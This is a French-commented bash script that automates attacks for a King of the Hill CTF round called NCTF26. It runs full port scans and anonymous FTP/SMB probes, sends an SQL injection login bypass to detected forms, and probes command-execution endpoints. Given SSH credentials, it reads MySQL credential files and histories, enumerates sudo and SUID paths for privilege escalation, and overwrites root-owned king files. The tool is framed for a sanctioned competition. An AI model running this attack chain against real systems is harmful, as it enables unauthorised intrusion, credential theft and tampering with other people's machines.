#!/usr/bin/env bash
# koth_auto.sh — Boite a outils KOTH generique, adaptee pour NCTF26 (format
# de flag NCTF{...}) a partir d'un script THM-specifique deja valide
# (2 victoires sur 3 rounds, session 2026-09-14). Base : recon complete
# immediate (TOUS les ports, les backdoors KOTH vivent sur des ports
# non-standards aleatoires), sondes FTP/SMB anonymes, RCE web bete,
# SQLi login bypass, GTFOBins/SUID, mysql history. AUCUNE box KOTH n'est
# identique : ce script fait gagner du temps sur le repetitif, il ne
# garantit pas un pwn 100% automatique.
#
# Lecon cle (round 1 perdu a cause de ca, voir knowledge/patterns/misc/
# koth-methodology-thm-validated.md) : ne JAMAIS se contenter des ports
# "probables" — scanner TOUT (-p-), les vecteurs gagnants vivent souvent
# sur des ports applicatifs custom (ex. 9001/9002, 15065, 46969...).
#
# Usage:
#   ./koth_auto.sh <IP> <NOM_EQUIPE_OU_PSEUDO> [SSH_USER] [SSH_PASS] [SSH_PORT]
#
#   <IP>                  IP de la cible affichee sur la page KOTH
#   <NOM_EQUIPE_OU_PSEUDO> Nom a ecrire dans le fichier "king" une fois
#                         root/acces suffisant obtenu
#   SSH_USER/PASS/PORT (optionnels) : creds SSH deja trouves -> phase 2
#                         (chasse aux flags + ecriture du fichier king)
#
# Exemple phase 1 (recon + exploitation de base, des le debut du round):
#   ./koth_auto.sh 10.10.76.190 NotreEquipe
#
# Exemple phase 2 (creds SSH trouves a la main, ex. via SQLi):
#   ./koth_auto.sh 10.10.76.190 NotreEquipe hermione 'motdepasse' 10514
#
# Resultat : un dossier ./koth_<IP>_<timestamp>/ avec tous les logs, et
# les flags NCTF{...} detectes affiches en clair a l'ecran.
#
# IMPORTANT reglement NCTF26 : pas de bruteforce ni de denial-of-service
# (voir regles ctf.tg). Ce script ne fait AUCUN bruteforce de mot de
# passe par defaut — seulement des tests anonymes/par defaut (FTP/SMB
# anonyme, SQLi bypass classique), conforme au reglement. Ne pas y
# ajouter de bruteforce de credentials.

set -uo pipefail

IP="${1:-}"
TEAM="${2:-}"
SSH_USER="${3:-}"
SSH_PASS="${4:-}"
SSH_PORT="${5:-22}"

# Noms de fichier "king"/"owner" candidats : chaque plateforme KOTH a sa
# propre convention (CTFd KotH agent utilise souvent owner.txt par defaut,
# THM utilise king.txt). On tente les deux + variantes pour NCTF, inconnues
# a l'avance tant que la page d'epreuve KOTH n'est pas vue en vrai.
KING_FILENAMES=("king.txt" "owner.txt" "flag.txt")
KING_DIR_CANDIDATES=("/root" "/opt/koth" "/var/koth" "/srv/koth")

if [[ -z "$IP" || -z "$TEAM" ]]; then
    echo "Usage: $0 <IP> <NOM_EQUIPE_OU_PSEUDO> [SSH_USER] [SSH_PASS] [SSH_PORT]"
    exit 1
fi

TS=$(date +%s)
OUTDIR="./koth_${IP}_${TS}"
mkdir -p "$OUTDIR"
FLAGFILE="$OUTDIR/flags_found.txt"
touch "$FLAGFILE"

C_G="\033[1;32m"; C_R="\033[1;31m"; C_Y="\033[1;33m"; C_B="\033[1;34m"; C_N="\033[0m"

log()  { echo -e "${C_B}[*]${C_N} $*"; }
ok()   { echo -e "${C_G}[+]${C_N} $*"; }
warn() { echo -e "${C_Y}[!]${C_N} $*"; }
err()  { echo -e "${C_R}[-]${C_N} $*"; }

grab_flags() {
    # $1 = texte a scanner, $2 = source (pour le log)
    # Format NCTF26 confirme : NCTF{...} (voir ctf.tg).
    local matches
    matches=$(grep -oE 'NCTF\{[^}]+\}' <<<"$1" 2>/dev/null | sort -u)
    if [[ -n "$matches" ]]; then
        while IFS= read -r m; do
            if ! grep -qxF "$m" "$FLAGFILE" 2>/dev/null; then
                ok "FLAG trouve (${2}) : $m"
                echo "$m" >> "$FLAGFILE"
            fi
        done <<<"$matches"
    fi
}

# ============================================================
# PHASE 1 — RECON COMPLETE
# ============================================================
phase1_recon() {
    log "Phase 1 : scan complet des ports sur $IP (peut prendre 30-60s)..."
    sudo nmap --privileged -Pn -p- --min-rate 3000 -T4 --max-retries 1 -oN "$OUTDIR/ports.txt" "$IP" >/dev/null 2>&1 \
        || nmap -Pn -p- --min-rate 3000 -T4 --max-retries 1 -oN "$OUTDIR/ports.txt" "$IP" >/dev/null 2>&1

    PORTS=$(grep -oE '^[0-9]+/tcp\s+open' "$OUTDIR/ports.txt" | grep -oE '^[0-9]+')
    if [[ -z "$PORTS" ]]; then
        err "Aucun port ouvert detecte (scan rate ou VPN down ?)."
        cat "$OUTDIR/ports.txt"
        exit 1
    fi
    ok "Ports ouverts : $(echo $PORTS | tr '\n' ' ')"
    warn "Rappel : ne pas s'arreter aux ports 'probables' (80/22/etc.) — les vecteurs KOTH vivent souvent sur un port custom ci-dessus."

    PORTLIST=$(echo $PORTS | tr ' ' ',')
    log "Scan de version/scripts sur ces ports..."
    nmap -Pn -p"$PORTLIST" -sV -sC -oN "$OUTDIR/services.txt" "$IP" >/dev/null 2>&1 &
    NMAP_PID=$!

    # --- Tests en parallele pendant que nmap -sV tourne ---

    for p in $PORTS; do
        case "$p" in
            21)
                log "[FTP:$p] Test anonyme..."
                {
                    echo "user anonymous anonymous"
                    echo "ls -la"
                } | timeout 10 ftp -n "$IP" "$p" > "$OUTDIR/ftp_${p}.txt" 2>&1
                if grep -qi "230" "$OUTDIR/ftp_${p}.txt"; then
                    ok "[FTP:$p] Acces anonyme OK — voir $OUTDIR/ftp_${p}.txt"
                    grab_flags "$(cat "$OUTDIR/ftp_${p}.txt")" "FTP:$p listing"
                else
                    warn "[FTP:$p] Anonyme refuse."
                fi
                ;;
            139|445)
                log "[SMB:$p] Test anonyme..."
                timeout 10 smbclient -L "//$IP/" -N > "$OUTDIR/smb_shares.txt" 2>&1
                ok "[SMB] Partages listes — voir $OUTDIR/smb_shares.txt"
                cat "$OUTDIR/smb_shares.txt"
                ;;
            22)
                log "[SSH:$p] Banner : $(timeout 5 bash -c "echo | nc -w3 $IP $p 2>/dev/null | head -c 80")"
                ;;
            *)
                log "[TCP:$p] Banner brut : $(timeout 5 bash -c "echo | nc -w3 $IP $p 2>/dev/null | head -c 120")"
                ;;
        esac
    done

    # --- Sondage HTTP generique sur TOUS les ports ouverts (y compris non-standards) ---
    for p in $PORTS; do
        BODY=$(timeout 6 curl -s -m 5 "http://$IP:$p/" 2>/dev/null)
        if [[ -n "$BODY" ]]; then
            echo "$BODY" > "$OUTDIR/http_${p}_root.html"
            ok "[HTTP:$p] Reponse HTTP recue — voir $OUTDIR/http_${p}_root.html"
            grab_flags "$BODY" "HTTP:$p /"

            # Detecte un formulaire de login classique et teste le bypass SQLi
            # classique (autorise par le reglement : ce n'est pas un bruteforce,
            # une seule requete, un payload connu, pas une boucle de tentatives).
            if echo "$BODY" | grep -qiE '<form[^>]*action="([^"]*login[^"]*)"'; then
                ACTION=$(echo "$BODY" | grep -oiE 'action="[^"]*"' | head -1 | sed -E 's/action="([^"]*)"/\1/')
                warn "[HTTP:$p] Formulaire de login detecte (action=$ACTION) — tentative SQLi bypass (1 requete, pas de bruteforce)..."
                for field in username user login email; do
                    RESP=$(timeout 6 curl -s -m 5 -X POST "http://$IP:$p/$ACTION" \
                        --data-urlencode "$field=admin' OR '1'='1'-- -" \
                        --data-urlencode "password=x" 2>/dev/null)
                    if [[ -n "$RESP" ]]; then
                        grab_flags "$RESP" "HTTP:$p SQLi bypass($field)"
                    fi
                done
            fi

            # Detecte un endpoint generique "execution de commande" (style /api/cmd)
            # Pattern deja observe en KOTH : page "host monitoring"/"ping this IP",
            # validation IP cote JS seulement -> payload shell brut accepte tel quel.
            for apiendpoint in api/cmd cmd api/ping ping; do
                RESP=$(timeout 5 curl -s -m 4 -X POST "http://$IP:$p/$apiendpoint" --data "id" 2>/dev/null)
                if echo "$RESP" | grep -qE 'uid=[0-9]+\(.*\)'; then
                    ok "[HTTP:$p] RCE probable sur /$apiendpoint !! Reponse : $RESP"
                    echo "RCE_ENDPOINT=http://$IP:$p/$apiendpoint" >> "$OUTDIR/rce_found.txt"
                fi
            done
        fi
    done

    wait "$NMAP_PID" 2>/dev/null
    ok "Scan de version termine — voir $OUTDIR/services.txt"
    grab_flags "$(cat "$OUTDIR/services.txt")" "nmap -sV -sC banners"

    echo
    ok "=== FIN PHASE 1 ==="
    if [[ -f "$OUTDIR/rce_found.txt" ]]; then
        warn "RCE endpoint(s) detecte(s) — exploite-le directement :"
        cat "$OUTDIR/rce_found.txt"
        echo "  Exemple : curl -X POST <RCE_ENDPOINT> --data 'ta_commande'"
    fi
    warn "Regarde les fichiers dans $OUTDIR pour la suite manuelle (chaque box KOTH a ses propres vulnerabilites)."
    warn "Des que tu as des creds SSH (trouves a la main), relance :"
    echo "  $0 $IP $TEAM <user> <pass> <port>"
}

# ============================================================
# PHASE 2 — CHASSE AUX FLAGS + FICHIER KING (necessite SSH)
# ============================================================
phase2_hunt() {
    log "Phase 2 : connexion SSH a $SSH_USER@$IP:$SSH_PORT..."

    if ! command -v sshpass >/dev/null; then
        err "sshpass n'est pas installe (sudo apt install sshpass). Abandon phase 2."
        return 1
    fi

    SSH_CMD="sshpass -p $SSH_PASS ssh -p $SSH_PORT -o StrictHostKeyChecking=no -o ConnectTimeout=6 $SSH_USER@$IP"

    if ! $SSH_CMD "true" 2>/dev/null; then
        err "Connexion SSH echouee. Verifie user/pass/port."
        return 1
    fi
    ok "SSH OK."

    log "Recherche de flags, sudo -l, SUID, mysql history, cron, demon KOTH..."
    REMOTE_OUT=$($SSH_CMD "
        echo '---find-flags---'
        find / -xdev \( -iname 'flag*' -o -iname '*.flag' -o -iname 'king*' -o -iname 'owner*' -o -iname 'NCTF*' \) 2>/dev/null -exec sh -c 'echo ==={}===; cat {} 2>/dev/null' \;
        echo '---koth-daemon-strings---'
        for b in /root/koth /opt/koth/* /usr/local/bin/koth* /usr/local/bin/*agent*; do
            [ -f \"\$b\" ] && echo \"== \$b ==\" && strings \"\$b\" 2>/dev/null | grep -iE 'king|owner|\\.txt' | head -20
        done
        echo '---sudo-l---'
        sudo -n -l 2>&1
        echo '---suid---'
        find / -xdev \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null
        echo '---mysql-history---'
        cat ~/.mysql_history 2>/dev/null
        cat /root/.mysql_history 2>/dev/null
        echo '---debian-cnf---'
        cat /etc/mysql/debian.cnf 2>/dev/null
        echo '---crontab---'
        crontab -l 2>&1
        cat /etc/crontab 2>/dev/null | grep -v '^#'
    " 2>&1)

    echo "$REMOTE_OUT" > "$OUTDIR/ssh_hunt.txt"
    ok "Resultats bruts dans $OUTDIR/ssh_hunt.txt"
    grab_flags "$REMOTE_OUT" "SSH hunt"

    # GTFOBins date -f rapide si sudo date NOPASSWD detecte
    if echo "$REMOTE_OUT" | grep -qE 'NOPASSWD:\s*/bin/date'; then
        warn "sudo date NOPASSWD detecte -> lecture arbitraire de fichiers root possible."
        echo "  Exemple : $SSH_CMD \"sudo -n /bin/date -f /root/<nom_fichier>\""
    fi

    log "Tentative d'ecriture du fichier king (plusieurs noms/emplacements candidats, nom exact confirme a verifier sur la page KOTH)..."
    WRITE_LOG="$OUTDIR/king_write.txt"
    : > "$WRITE_LOG"
    for dir in "${KING_DIR_CANDIDATES[@]}"; do
        for fname in "${KING_FILENAMES[@]}"; do
            PATH_TRY="$dir/$fname"
            WRITE_OUT=$($SSH_CMD "
                echo '$TEAM' > '$PATH_TRY' 2>&1 && echo KING_OK_DIRECT:$PATH_TRY
                sudo -n bash -c \"echo '$TEAM' > '$PATH_TRY'\" 2>&1 && echo KING_OK_SUDO:$PATH_TRY
            " 2>&1)
            echo "-- $PATH_TRY --" >> "$WRITE_LOG"
            echo "$WRITE_OUT" >> "$WRITE_LOG"
            if echo "$WRITE_OUT" | grep -q "KING_OK"; then
                ok "Fichier king ecrit avec succes : $PATH_TRY = $TEAM"
            fi
        done
    done

    if grep -q "KING_OK" "$WRITE_LOG"; then
        ok "Au moins un fichier king/owner ecrit — voir $WRITE_LOG pour le chemin exact qui a marche."
    else
        warn "Aucune ecriture directe n'a reussi (pas encore root, ou chemin/nom different sur cette box)."
        warn "Verifie le vrai chemin attendu : cherche les strings du demon KOTH (voir section koth-daemon-strings ci-dessus dans $OUTDIR/ssh_hunt.txt)."
        warn "Une fois root/le bon chemin identifie, ecris-le toi-meme :"
        echo "  echo '$TEAM' > /chemin/exact/king.txt"
    fi
}

# ============================================================
# MAIN
# ============================================================
echo "=================================================="
echo " KOTH AUTO (NCTF26) — cible: $IP   equipe/pseudo: $TEAM"
echo "=================================================="

if [[ -n "$SSH_USER" && -n "$SSH_PASS" ]]; then
    phase2_hunt
else
    phase1_recon
fi

echo
echo "=================================================="
if [[ -s "$FLAGFILE" ]]; then
    ok "FLAGS TROUVES (${OUTDIR}/flags_found.txt) :"
    cat "$FLAGFILE"
else
    warn "Aucun flag trouve automatiquement cette fois — exploitation manuelle requise."
fi
echo "=================================================="
